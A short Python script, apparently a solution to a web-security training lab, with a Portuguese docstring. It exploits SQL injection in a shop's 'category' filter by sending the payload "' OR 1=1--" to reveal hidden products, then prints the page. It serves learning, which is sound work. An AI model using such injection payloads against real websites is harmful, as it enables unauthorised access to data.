"""
Lab: SQL Injection vulnerability in WHERE clause allowing retrieval of hidden data

Objetivo:
Explorar uma SQL Injection no parâmetro 'category' 
para retornar produtos ocultos (released = 0).

Query original:
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
"""

import requests

PAYLOAD = "' OR 1=1--"

target_url = input("URL do laboratório: ")

params = {
    "category": f"Gifts{PAYLOAD}"
}

response = requests.get(
    f"{target_url.rstrip('/')}/filter",
    params=params
)

print(response.text)